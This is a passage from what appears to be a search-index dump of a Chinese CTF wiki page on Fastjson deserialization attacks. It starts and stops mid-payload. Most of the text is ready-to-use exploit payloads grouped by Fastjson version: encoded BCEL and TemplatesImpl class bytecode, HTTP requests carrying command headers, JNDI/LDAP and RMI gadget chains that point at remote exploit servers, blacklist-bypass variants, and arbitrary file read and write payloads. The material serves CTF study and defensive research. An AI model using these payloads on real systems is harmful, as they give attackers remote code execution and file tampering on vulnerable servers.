$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A\" } }: \"x\" }","title":"bcel"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#1233-fastjson-1247","text":"POST / json HTTP / 1.1 Host: 127.0.0.1 : 9092 Content - Type : application / json cmd: whoami Content - Length : 3647 { \"xx\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" }, \"x\" : { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"c\" : { \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\" } } : \"xxx\" } } 1.2.33<=fastjson<=12.36 { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" }, \"x\" : { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"c\" : { \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL...\" } } : \"ddd\" } } 1.2.37<=fastjson<=1.2.47 { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" }, \"x\" : { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"y\" : { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"c\" : { \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$..\" , \"$ref\" : \"$.x.y.c.connection\" } } } } \u5176\u4ed6 { \"@type\" : \"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\" , \"key\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driver\" : \"$$BCEL$$xxxxxxx\" }","title":"1.2.33 &lt;= fastjson &lt;= 1.2.47"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#templatesimpl","text":"\u5229\u7528\u6761\u4ef6\u82db\u523b\uff0c\u53ef\u7528\u4e8e\u89e3\u51b3\u4e0d\u51fa\u7f51\u5229\u7528\u3002 \u9700\u8981\u8c03\u7528 parseObject() \u65b9\u6cd5\u65f6\uff0c\u52a0\u5165Feature.SupportNonPublicField\u53c2\u6570\u3002 _bytecodes\u8981\u8fdb\u884cbase64\u7f16\u7801 { \"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" , \"_bytecodes\" : [ \"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg==\" ] , \"_name\" : \"a.b\" , \"_tfactory\" :{ }, \"_outputProperties\" :{ }, \"_version\" : \"1.0\" , \"allowedProtocols\" : \"all\" }","title":"TemplatesImpl"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#c3p0wrapperconnectionpooldatasource","text":"\u53ef\u7528\u4e8e\u89e3\u51b3\u4e0d\u51fa\u7f51\u5229\u7528\u3002 fastjson <1.2.47 \u5229\u7528c3p0\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316 cc payload\u5230\u8fbe\u56de\u663e\u3002 POST / json HTTP / 1.1 Host: 127.0.0.1 : 8999 Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit / 537.36 ( KHTML , like Gecko ) Chrome / 75.0.3770.142 Safari / 537.36 Accept: text / html , application / xhtml + xml , application / xml ; q = 0.9 , image / webp , image / apng , */* ; q = 0.8 , application / signed - exchange ; v = b3 Accept - Encoding : gzip , deflate cmd: dir Accept - Language : zh - CN , zh ; q = 0.9 Connection: close Content - Type : application / json Content - Length : 8925 { \"e\" :{ \"@type\" : \"java.lang.Class\" , \"val\" : \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" }, \"f\" :{ \"@type\" : \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" , \"userOverridesAsString\" : \"HexAsciiSerializedMap}}","title":"c3p0#WrapperConnectionPoolDataSource"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson-1225-1241","text":"1.2.25\u540e\u5c06TypeUtils.loadClass\u66ff\u6362\u4e3acheckAutoType()\u51fd\u6570\uff0c\u589e\u52a0\u4e86\u9ed1\u540d\u5355\u548c\u767d\u540d\u5355\u3002 \u628aautoTypeSupport\u9ed8\u8ba4\u4e3aFalse\u3002 \u5f53autoTypeSupport\u4e3aFalse\u65f6\uff0c\u5148\u9ed1\u540d\u5355\u8fc7\u6ee4\uff0c\u518d\u767d\u540d\u5355\u8fc7\u6ee4\uff0c\u82e5\u767d\u540d\u5355\u5339\u914d\u4e0a\u5219\u76f4\u63a5\u52a0\u8f7d\u8be5\u7c7b\uff0c\u5426\u5219\u62a5\u9519\u3002 \u5f53autoTypeSupport\u4e3aTrue\u65f6\uff0c\u5148\u767d\u540d\u5355\u8fc7\u6ee4\uff0c\u5339\u914d\u6210\u529f\u5373\u53ef\u52a0\u8f7d\u8be5\u7c7b\uff0c\u5426\u5219\u518d\u9ed1\u540d\u5355\u8fc7\u6ee4\u3002 1.2.25\u9ed1\u540d\u5355 bsh com . mchange com . sun . java . lang . Thread java . net . Socket java . rmi javax . xml org . apache . bcel org . apache . commons . beanutils org . apache . commons . collections . Transformer org . apache . commons . collections . functors org . apache . commons . collections4 . comparators org . apache . commons . fileupload org . apache . myfaces . context . servlet org . apache . tomcat org . apache . wicket . util org . codehaus . groovy . runtime org . hibernate org . jboss org . mozilla . javascript org . python . core org . springframework exp \u6761\u4ef6\u9700\u8981\u5f00\u542fautotype \u7c7b\u540d\u524d\u9762\u52a0\u4e86\u4e00\u4e2aL\uff0c\u540e\u9762\u52a0\u4e00\u4e2a;\u53ef\u4ee5\u7ed5\u8fc7\u9ed1\u540d\u5355 { \"@type\" : \"Lcom.sun.rowset.JdbcRowSetImpl;\" , \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true }","title":"Fastjson 1.2.25-1.2.41"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson-1225-1242","text":"\u4ece1.2.42\u7248\u672c\u5f00\u59cb,\u628a\u4e4b\u524d\u7684\u660e\u6587\u9ed1\u540d\u5355\uff0c\u6539\u4e3ahash\u9ed1\u540d\u5355\u3002 \u5982\u4e0b\u5927\u4f6c\u6574\u7406\u7684 https://github.com/LeadroyaL/fastjson-blacklist exp \u6761\u4ef6\u9700\u8981\u5f00\u542fautotype \u53cc\u5199\u7ed5\u8fc7 { \"@type\" : \"LLcom.sun.rowset.JdbcRowSetImpl;;\" , \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true }","title":"Fastjson 1.2.25-1.2.42"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson-1225-1243","text":"exp \u6761\u4ef6\u9700\u8981\u5f00\u542fautotype \u52a0[{\u7ed5\u8fc7 { \"@type\" : \"[com.sun.rowset.JdbcRowSetImpl\" [ {, \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true }","title":"Fastjson 1.2.25-1.2.43"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson-1225-1245","text":"\u6761\u4ef6\u9700\u8981\u5f00\u542fautotype 45\u628a\u4e4b\u524d\u95ee\u9898\u4fee\u4e86\uff0c\u4f46\u662f\u53ef\u4ee5\u501f\u52a9\u7b2c\u4e09\u65b9\u7ec4\u4ef6\u7ed5\u8fc7\u3002 \u9700\u8981mybatis\uff0c\u4e14\u7248\u672c\u9700\u4e3a3.x.x\u7cfb\u5217<3.5.0\u7684\u7248\u672c\u3002 { \"@type\" : \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\" , \"properties\" :{ \"data_source\" : \"ldap://localhost:1389/badNameClass\" }}","title":"Fastjson 1.2.25-1.2.45"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson1225-1247","text":"\u501f\u52a9\u7f13\u5b58\u8fdb\u884c\u901a\u6740\uff0c\u7f13\u5b58\u57281.2.48\u88ab\u6539\u4e3a\u9ed8\u8ba4\u5173\u95ed \u6f0f\u6d1e\u539f\u7406\u662f\u901a\u8fc7java.lang.Class\uff0c\u5c06JdbcRowSetImpl\u7c7b\u52a0\u8f7d\u5230Map\u4e2d\u7f13\u5b58\uff0c\u4ece\u800c\u7ed5\u8fc7AutoType\u7684\u68c0\u6d4b \u8fd9\u91cc\u6709\u4e24\u5927\u7248\u672c\u8303\u56f4\uff1a 1.2.25-1.2.32\u7248\u672c\uff1a\u672a\u5f00\u542fAutoTypeSupport\u65f6\u80fd\u6210\u529f\u5229\u7528\uff0c\u5f00\u542fAutoTypeSupport\u4e0d\u80fd\u5229\u7528 1.2.33-1.2.47\u7248\u672c\uff1a\u65e0\u8bba\u662f\u5426\u5f00\u542fAutoTypeSupport\uff0c\u90fd\u80fd\u6210\u529f\u5229\u7528 poc: { \"a\" :{ \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.rowset.JdbcRowSetImpl\" }, \"b\" :{ \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true } } 1.2.48\u4e4b\u540e\u7248\u672c\uff0c\u5c0f\u5f1f\u6c34\u5e73\u6709\u9650\u8fd8\u672a\u590d\u73b0\u7814\u7a76\uff0cpayload\u9700\u8981\u6ce8\u610f\u7684\u7ec6\u8282\u8fd8\u672a\u63a2\u7d22","title":"Fastjson1.2.25-1.2.47\u901a\u6740"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson125-1259","text":"\u9700\u8981\u5f00\u542fAutoType { \"@type\" : \"com.zaxxer.hikari.HikariConfig\" , \"metricRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"com.zaxxer.hikari.HikariConfig\" , \"healthCheckRegistry\" : \"ldap://localhost:1389/Exploit\" }","title":"Fastjson1.2.5 &lt;= 1.2.59"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson125-1260","text":"\u65e0\u9700\u5f00\u542f autoType\uff1a { \"@type\" : \"oracle.jdbc.connector.OracleManagedConnectionFactory\" , \"xaDataSourceName\" : \"rmi://10.10.20.166:1099/ExportObject\" } { \"@type\" : \"org.apache.commons.configuration.JNDIConfiguration\" , \"prefix\" : \"ldap://10.10.20.166:1389/ExportObject\" }","title":"Fastjson1.2.5 &lt;= 1.2.60"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson125-1261","text":"{ \"@type\" : \"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\" , \"jndiName\" : \"ldap://localhost:1389/Exploit\" , \"Object\" : \"a\" }","title":"Fastjson1.2.5 &lt;= 1.2.61"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson-1262","text":"\u9700\u8981\u5f00\u542fAutoType\uff1b Fastjson <= 1.2.62\uff1b JNDI\u6ce8\u5165\u5229\u7528\u6240\u53d7\u7684JDK\u7248\u672c\u9650\u5236\uff1b \u76ee\u6807\u670d\u52a1\u7aef\u9700\u8981\u5b58\u5728xbean-reflect\u5305\uff1b { \"@type\" : \"org.apache.xbean.propertyeditor.JndiConverter\" , \"AsText\" : \"rmi://127.0.0.1:1098/exploit\" } { \"@type\" : \"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\" , \"parameters\" : { \"@type\" : \"java.util.Hashtable\" , \"java.naming.factory.initial\" : \"com.sun.jndi.rmi.registry.RegistryContextFactory\" , \"topic-factory\" : \"ldap://localhost:1389/Exploit\" }, \"namespace\" : \"\" }","title":"Fastjson &lt;1.2.62"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson1266","text":"","title":"fastjson&lt;=1.2.66"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#_3","text":"\u5f00\u542fAutoType\uff1b Fastjson <= 1.2.66\uff1b JNDI\u6ce8\u5165\u5229\u7528\u6240\u53d7\u7684JDK\u7248\u672c\u9650\u5236\uff1b org.apache.shiro.jndi.JndiObjectFactory\u7c7b\u9700\u8981shiro-core\u5305\uff1b br.com.anteros.dbcp.AnterosDBCPConfig\u7c7b\u9700\u8981Anteros-Core\u548cAnteros-DBCP\u5305\uff1b com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\u7c7b\u9700\u8981ibatis-sqlmap\u548cjta\u5305\uff1b { \"@type\" : \"org.apache.shiro.jndi.JndiObjectFactory\" , \"resourceName\" : \"ldap://192.168.80.1:1389/Calc\" } { \"@type\" : \"org.apache.shiro.realm.jndi.JndiRealmFactory\" , \"jndiNames\" : [ \"ldap://localhost:1389/Exploit\" ] , \"Realms\" : [ \"\" ] } { \"@type\" : \"br.com.anteros.dbcp.AnterosDBCPConfig\" , \"metricRegistry\" : \"ldap://192.168.80.1:1389/Calc\" } { \"@type\" : \"br.com.anteros.dbcp.AnterosDBCPConfig\" , \"healthCheckRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\" , \"jndiNames\" : \"ldap://192.168.80.1:1389/Calc\" } { \"@type\" : \"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\" , \"properties\" : { \"@type\" : \"java.util.Properties\" , \"UserTransaction\" : \"ldap://192.168.80.1:1399/Calc\" }} \u9002\u7528\u4e8ejdk11\u4ee5\u4e0a\u7248\u672c\u7684\u5199\u6587\u4ef6\u7684payload\uff1a { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"sun.rmi.server.MarshalOutputStream\" , \"out\" : { \"@type\" : \"java.util.zip.InflaterOutputStream\" , \"out\" : { \"@type\" : \"java.io.FileOutputStream\" , \"file\" : \"/tmp/asdasd\" , \"append\" : true }, \"infl\" : { \"input\" : { \"array\" : \"eJxLLE5JTCkGAAh5AnE=\" , \"limit\" : 14 } }, \"bufLen\" : \"100\" }, \"protocolVersion\" : 1 }","title":"\u524d\u63d0\u6761\u4ef6"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson1267","text":"","title":"fastjson&lt;=1.2.67"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#_4","text":"\u5f00\u542fAutoType\uff1b Fastjson <= 1.2.67\uff1b JNDI\u6ce8\u5165\u5229\u7528\u6240\u53d7\u7684JDK\u7248\u672c\u9650\u5236\uff1b org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\u7c7b\u9700\u8981ignite-core\u3001ignite-jta\u548cjta\u4f9d\u8d56\uff1b org.apache.shiro.jndi.JndiObjectFactory\u7c7b\u9700\u8981shiro-core\u548cslf4j-api\u4f9d\u8d56\uff1b { \"@type\" : \"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\" , \"jndiNames\" :[ \"ldap://localhost:1389/Exploit\" ], \"tm\" : { \"$ref\" : \"$.tm\" }} { \"@type\" : \"org.apache.shiro.jndi.JndiObjectFactory\" , \"resourceName\" : \"ldap://localhost:1389/Exploit\" , \"instance\" :{ \"$ref\" : \"$.instance\" }}","title":"\u524d\u63d0\u6761\u4ef6"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson1268","text":"Fastjson <= 1.2.68\uff1b \u5229\u7528\u7c7b\u5fc5\u987b\u662fexpectClass\u7c7b\u7684\u5b50\u7c7b\u6216\u5b9e\u73b0\u7c7b\uff0c\u5e76\u4e14\u4e0d\u5728\u9ed1\u540d\u5355\u4e2d\uff1b { \"@type\" : \"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\" , \"metricRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\" , \"healthCheckRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"com.caucho.config.types.ResourceRef\" , \"lookupName\" : \"ldap://localhost:1389/Exploit\" , \"value\" : { \"$ref\" : \"$.value\" }} \u65e0\u9700\u5f00\u542fAutoType\uff0c\u76f4\u63a5\u6210\u529f\u7ed5\u8fc7CheckAutoType()\u7684\u68c0\u6d4b\u4ece\u800c\u89e6\u53d1\u6267\u884c\uff1a { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"vul.VulAutoCloseable\" , \"cmd\" : \"calc\" } \u8bfb\u6587\u4ef6 { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.eclipse.core.internal.localstore.SafeFileOutputStream\" , \"tempPath\" : \"C:/Windows/win.ini\" , \"targetPath\" : \"D:/wamp64/www/win.txt\" } \u5199\u6587\u4ef6 { \"stream\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.eclipse.core.internal.localstore.SafeFileOutputStream\" , \"targetPath\" : \"D:/wamp64/www/hacked.txt\" , \"tempPath\" : \"D:/wamp64/www/test.txt\" }, \"writer\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.esotericsoftware.kryo.io.Output\" , \"buffer\" : 